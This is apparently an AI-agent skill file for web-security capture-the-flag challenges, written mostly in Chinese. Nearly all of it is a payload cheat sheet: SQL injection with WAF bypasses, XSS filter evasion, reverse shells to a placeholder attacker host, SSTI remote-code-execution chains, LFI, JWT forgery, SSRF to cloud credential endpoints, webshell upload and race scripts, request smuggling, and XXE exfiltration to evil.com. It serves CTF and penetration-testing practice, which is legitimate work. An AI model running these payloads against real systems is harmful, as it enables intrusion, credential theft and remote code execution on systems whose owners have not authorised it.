---
name: web-security
description: Use when facing web security challenges involving injection, authentication bypass, IDOR, access control, CSRF, HRS, server-side vulnerabilities, or web application exploitation
---

# Web Security CTF Skill

## 容器可用工具

| 工具 | 命令 | 用途 |
|------|------|------|
| nmap | `nmap -sV -sC -p- target` | 端口扫描、服务识别 |
| ffuf | `ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt` | 目录/参数 Fuzz |
| sqlmap | `sqlmap -u "URL?id=1" --batch --tamper=space2comment` | SQL 注入自动化 |
| whatweb | `whatweb URL` | 技术栈识别 |
| nuclei | `nuclei -u URL -t cves/` | 模板化漏洞扫描 |
| httpx | `httpx -u URL -title -status-code -tech-detect` | Web 探测 |
| katana | `katana -u URL -d 3` | 爬虫/URL 发现 |
| subfinder | `subfinder -d domain.com` | 子域名枚举 |
| arjun | `arjun -u URL` | 隐藏参数发现 |
| wpscan | `wpscan --url URL` | WordPress 扫描 |
| commix | `commix -u "URL?cmd=test"` | 命令注入自动化 |
| hydra | `hydra -l admin -P wordlist target http-post-form "..."` | 在线暴力破解 |
| sslscan | `sslscan target` | SSL/TLS 检测 |
| tplmap | `tplmap -u "URL?name=test"` | SSTI 自动检测 |
| xsstrike | `xsstrike -u "URL?q=test"` | XSS 检测 |
| clairvoyance | `clairvoyance -u URL/graphql` | GraphQL Schema 侦察 |
| jwt-tool | `jwt-tool TOKEN` | JWT 攻击 |
| gopherus | `gopherus --exploit mysql` | SSRF gopher 协议利用 |
| phpggc | `phpggc Laravel/RCE1 system id` | PHP 反序列化链生成 |
| ysoserial | `ysoserial CommonsCollections1 'cmd'` | Java 反序列化链生成 |

**词表**: `/usr/share/seclists/`

---

## 首触侦察 (任何目标先跑这5步)

```bash
curl -sI "$URL" | head -30                                    # 响应头 → Server/X-Powered-By/Set-Cookie
whatweb "$URL" 2>/dev/null                                    # 技术栈指纹
ffuf -u "${URL}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 2>/dev/null
curl -s "$URL/robots.txt"; curl -s "$URL/.git/HEAD"; curl -s "$URL/www.zip" -o /dev/null -w "%{http_code}"
arjun -u "$URL" --stable 2>/dev/null                          # 隐藏参数发现
```

---

## 漏洞调度表

| 类型 | 识别特征 | Module |
|------|----------|--------|
| SQL 注入 | 参数回显异常、`'` 报错、搜索框 | `modules/sqli.md` |
| XSS | 输入回显到页面、评论/昵称 | `modules/xss.md` |
| 命令执行 | ping 功能、参数拼接到命令 | `modules/rce.md` |
| 文件包含 | `page=`/`file=`/`include=` | `modules/lfi.md` |
| 文件上传 | 头像/附件上传入口 | `modules/upload.md` |
| SSRF | URL 参数、图片加载、PDF 生成 | `modules/ssrf.md` |
| SSTI | `{{7*7}}`→49、模板语法回显 | `modules/ssti.md` |
| XXE | XML 输入、SOAP、text/xml | `modules/xxe.md` |
| 反序列化 | base64 blob、serialize 参数 | `modules/deserialize.md` |
| PHP 特性 | 弱类型`==`、伪协议 | `modules/php.md` |
| JWT | `Bearer` / eyJ 开头 cookie | `modules/jwt.md` |
| Java | Spring/Struts/Shiro/SpEL | `modules/java.md` |
| 区块链 | Solidity、合约地址 | `modules/blockchain.md` |
| 组件漏洞 | 已知版本号、中间件指纹 | `modules/cve.md` |
| IDOR | 数字ID/UUID 在 URL/API 中 | `modules/idor.md` |
| 认证绕过 | 登录/OTP/2FA、session | `modules/auth-bypass.md` |
| 访问控制 | 角色权限、越权 | `modules/access-control.md` |
| 业务逻辑/竞态 | 购买/优惠券/余额/并发 | `modules/business-logic.md` |
| CSRF/HRS | 表单提交、HTTP 走私 | `modules/request-forgery.md` |
| 信息搜集 | 未知目标全面侦察 | `modules/recon.md` |

---

## Payload Cheatsheets

### 1. SQL 注入

```sql
-- 联合注入
' ORDER BY 10-- -
' UNION SELECT NULL,NULL,NULL-- -
0' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- 报错注入 (MySQL)
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- 时间盲注 (多数据库)
' AND IF(1=1,SLEEP(3),0)-- -                                                   -- MySQL
';WAITFOR DELAY '0:0:3'--                                                       -- MSSQL
' AND 1=dbms_pipe.receive_message(('a'),3)--                                    -- Oracle
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--          -- PostgreSQL

-- 堆叠注入
';SET @a=0x73656C65637420404076657273696F6E;PREPARE s FROM @a;EXECUTE s;--
';HANDLER `tablename` OPEN;HANDLER `tablename` READ FIRST;--
```

**WAF 绕过速查**:

```
空格:     /**/  %09  %0a  %0d  %a0  /*!*/
关键字:   ununionion selselectect  |  UnIoN SeLeCt  |  /*!50000UNION*//*!50000SELECT*/
引号:     0x486578 (hex)  |  CHAR(97,100,109,105,110)
逗号:     UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
等号:     LIKE  |  REGEXP  |  BETWEEN...AND  |  IN()
OR/AND:   ||  &&  |  %26%26  |  %7C%7C
双重编码: %2527 → %27 → '   |   %25%36%31 → %61 → a
Unicode:  %u0027 (IIS)  |  ＇(fullwidth U+FF07)
HPP:      id=1&id=UNION&id=SELECT  (参数污染拼接)
JSON:     {"id":"1 UNION SELECT 1,2,3"}  (WAF 可能不查 JSON body)
Chunk TE: Transfer-Encoding: chunked 分块发送绕过 body 检测
```

**sqlmap tamper**:

```bash
sqlmap -u "URL" --batch --tamper=space2comment,between,randomcase
sqlmap -u "URL" --batch --tamper=charencode,chardoubleencode     # 双重编码
sqlmap -u "URL" --batch --random-agent --delay=1 --technique=T   # 慢速盲注
sqlmap -r request.txt --batch --level=5 --risk=3                 # burp 请求
sqlmap -u "URL" --batch --os-shell                               # 直接 shell
```

### 2. XSS

```html
<!-- 标签绕过 -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>

<!-- 属性上下文逃逸 -->
" autofocus onfocus=alert(1) x="
javascript:alert(1)//

<!-- JS 上下文逃逸 -->
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//

<!-- 编码绕过 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

<!-- 无括号 -->
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw+1>
<img src=x onerror=location='javascript:alert(1)'>

<!-- CSP 绕过 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
<base href="//evil.com/">                          <!-- 劫持相对路径 -->
```

**DOM XSS sink**: `innerHTML`, `document.write()`, `eval()`, `setTimeout(str)`, `location.href=`, `jQuery.html()`

### 3. 命令执行绕过

```bash
# 空格绕过
cat${IFS}/etc/passwd       |  {cat,/etc/passwd}         |  cat</etc/passwd
cat$IFS$9/etc/passwd       |  X=$'\x20';cat${X}/etc/passwd

# 关键字绕过
ca\t /etc/passwd           |  c'a't /etc/passwd          |  c"a"t /etc/passwd
/???/c?t /???/p?ss??       |  $(printf '\x63\x61\x74') /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh

# 分隔符: ;  |  ||  &  &&  %0a  %0d  `cmd`  $(cmd)

# 反弹 shell
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

### 4. SSTI (按引擎)

**检测决策树**:
`${7*7}`=49 → `${class.getResource("")}` 有输出→Freemarker, 否→Velocity
`{{7*7}}`=49 → `{{7*'7'}}`='7777777'→Jinja2, 否→Twig
`#{7*7}`=49 → ERB/EL  |  `<%= 7*7 %>`=49 → ERB/EJS

**Jinja2 (Python/Flask)**:

```python
# RCE 入口
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.__class__._load_form_data.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# 过滤 . → [] 或 |attr()
{{''['__class__']['__mro__'][1]['__subclasses__']()}}
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}

# 过滤 _ → request 或 hex
{{''[request.args.a]}}  &a=__class__
{{''|attr('\x5f\x5fclass\x5f\x5f')}}

# 过滤 [] → |attr() + |list + .pop()
{{(''|attr('__class__')|attr('__mro__')|list).pop(1)}}

# 过滤引号 → chr()
{% set chr=''.__class__.__mro__[-1].__subclasses__()[80].__init__.__globals__.__builtins__.chr %}
{{chr(111)~chr(115)}}

# 过滤 {{}} → {% %} + print
{% print(config) %}

# 沙箱逃逸 (找 warning 类)
{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
```

**Twig (PHP)**:

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}  // Twig 1.x
{{['id']|filter('system')}}    // Twig 3.x
{{['id']|map('system')}}       // Twig 3.x 备选
{{'/etc/passwd'|file_excerpt(0,100)}}  // 文件读取
```

**Freemarker (Java)**:

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}  // 方括号语法
```

**Velocity (Java)**:

```java
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$chr.toChars($out.read())#end
```

**Smarty (PHP)**: `{system('id')}`  |  `{if system('id')}{/if}`

### 5. 文件包含 (LFI)

```
=== PHP 伪协议 ===
php://filter/read=convert.base64-encode/resource=index.php       # 读源码
php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php        # 绕过关键字
php://input                                                       # POST body 执行
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # <?php system($_GET['c']);?>
phar://uploads/evil.jpg/shell.php                                 # phar 解析

=== 日志/Session ===
/var/log/apache2/access.log    /var/log/nginx/access.log          # UA 注入代码后包含
/tmp/sess_SESSIONID            /var/lib/php/sessions/sess_xxx     # session 注入

=== /proc ===
/proc/self/cmdline  /proc/self/environ  /proc/self/fd/N  /proc/self/maps

=== 遍历绕过 ===
../../../etc/passwd           ..%2f..%2f..%2fetc/passwd           # URL 编码
..%252f..%252f..%252fetc/passwd                                   # 双重编码
....//....//....//etc/passwd                                      # 双写绕过
```

**PHP filter chain RCE**: `php_filter_chain_generator.py -c '<?php system($_GET["c"]);?>'` → 无文件写入 RCE

### 6. JWT

```python
import jwt
# None 算法
token = jwt.encode({"user":"admin","role":"admin"}, key="", algorithm="none")
# RS256→HS256 混淆
pub = open("public.pem","rb").read()
token = jwt.encode({"user":"admin"}, pub, algorithm="HS256")
# kid 注入: {"kid":"../../dev/null"} → 空密钥  |  {"kid":"key' UNION SELECT 'secret'-- -"} → SQLi
# jku 注入: {"jku":"https://evil.com/jwks.json"} → 用你的 RSA 密钥
```

```bash
jwt-tool TOKEN -X a                   # alg:none
jwt-tool TOKEN -X k -pk public.pem    # key confusion
jwt-tool TOKEN -C -d rockyou.txt      # 密钥爆破
jwt-tool TOKEN -I -pc user -pv admin  # 修改 claim
```

### 7. SSRF

**IP 绕过 (127.0.0.1/localhost)**:

```
2130706433 | 0x7f000001 | 0177.0.0.1 | 127.1 | 0.0.0.0 | [::1] | [::]
127.0.0.1.nip.io (DNS rebinding) | 0x7f.0x0.0x0.0x1

云元数据:
  AWS:  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GCP:  http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)
  阿里云: http://100.100.100.200/latest/meta-data/

URL 解析差异: http://evil.com@127.0.0.1/  |  http://127.0.0.1#@evil.com  |  http://0/
协议: file:///etc/passwd  |  dict://127.0.0.1:6379/info  |  gopher://

gopher 内网:
  gopherus --exploit mysql/redis/fastcgi
```

### 8. PHP 反序列化

```php
// 魔术方法: __destruct → __toString → __call → __get → __invoke
// 绕过 __wakeup (CVE-2016-7124): O:4:"Test":2:{...} → O:4:"Test":3:{...}
```

**phar:// 触发 (无需 unserialize)**:

```php
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($evil_obj);  // POP chain 对象
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
// 触发: file_exists/is_dir/fopen/file_get_contents("phar://uploads/evil.gif/test.txt")
```

**phpggc**:

```bash
phpggc -l                              # 列出可用链
phpggc Laravel/RCE1 system 'id'        # Laravel
phpggc Monolog/RCE1 system 'id'        # Monolog
phpggc Symfony/RCE4 system 'id'        # Symfony
phpggc ThinkPHP/RCE1 system 'id'       # ThinkPHP
phpggc -b -f                           # -b base64, -f fast-destruct
```

### 9. 竞态条件

```python
import requests, threading

url = "http://target.com/api/transfer"
s = requests.Session()
s.post("http://target.com/login", data={"user":"test","pass":"test"})

def race():
    r = s.post(url, data={"to":"attacker","amount":"1000"})
    print(r.status_code, r.text[:80])

threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

**文件上传竞态** — 同时上传+访问:

```python
def upload():
    requests.post("http://target.com/upload", files={'file':('shell.php','<?php system($_GET["c"]);?>','image/png')})
def access():
    r = requests.get("http://target.com/uploads/shell.php?c=id")
    if "uid=" in r.text: print("[+]", r.text)
for _ in range(100):
    threading.Thread(target=upload).start()
    threading.Thread(target=access).start()
```

### 10. HTTP 请求走私

**CL.TE** (前端 Content-Length, 后端 Transfer-Encoding):

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: target.com
```

**TE.CL** (前端 Transfer-Encoding, 后端 Content-Length):

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
GPOST /
0

```

**TE 混淆**: `Transfer-Encoding : chunked` (空格) | `Transfer-Encoding: xchunked` | `Transfer-Encoding: chunKed` (大小写) | `X: x\nTransfer-Encoding: chunked` (header injection)

### 11. GraphQL

```graphql
# Introspection (获取 schema)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 批量枚举
{ a:user(id:1){password} b:user(id:2){password} c:user(id:3){password} }

# Mutation 提权
mutation { updateUser(id:1, role:"admin") { id role } }

# SQLi via GraphQL
{ user(name:"' OR 1=1--") { id password } }
```

Introspection 禁用时: `clairvoyance -u URL/graphql -w /usr/share/seclists/Discovery/Web-Content/graphql-field-names.txt`

### 12. XXE

```xml
<!-- 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- OOB 外带 (无回显) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<!-- evil.dtd: <!ENTITY % exfil SYSTEM "http://evil.com/?d=%file;"> %exfil; -->

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- SVG XXE (图片上传) -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### 13. 文件上传绕过

```
后缀: .phtml .php3 .php5 .pht .phar .php7 .pHp | .jspx .jspf | .aspx .cer .asa
双写: .pphphp | 截断: .php%00.jpg (PHP<5.3.4)
.htaccess: AddType application/x-httpd-php .xxx
.user.ini: auto_prepend_file=shell.jpg
MIME: Content-Type: image/png
文件头: GIF89a<?php system($_GET['c']);?>
解析漏洞:
  Apache: test.php.xxx (未知后缀向前)  |  Nginx: /test.jpg/x.php (fix_pathinfo)
  IIS 6: test.asp;.jpg               |  IIS 7: test.jpg/x.php
```

### 14. WAF 通用绕过

```
=== 编码 ===
URL: %27→'  %3C→<  | 双重: %2527→%27→'  | Unicode: %u0027 %uff07  | HTML: &#39; &#x27;

=== 传输 ===
Chunked TE: 分块发送绕过 body 检测  | HTTP/2: h2 降级差异
HPP: id=1/*&id=*/UNION+SELECT  | JSON body: WAF 可能不检查
Multipart boundary 混淆

=== 逻辑 ===
大小写: SeLeCt  | 注释: SEL/**/ECT /*!50000SELECT*/  | 空白: %09 %0a %0b %0c %0d %a0
拼接: CONC/**/AT() | 'ad'+'min'  | 换行: %0a  | 溢出: padding 4000+ 字符使 WAF 放弃
```

---

## Modules 调用规则

modules/ 包含各漏洞的详细攻击手册。本文件 payload 不够用时读取对应 module 获取完整流程和特殊场景处理。
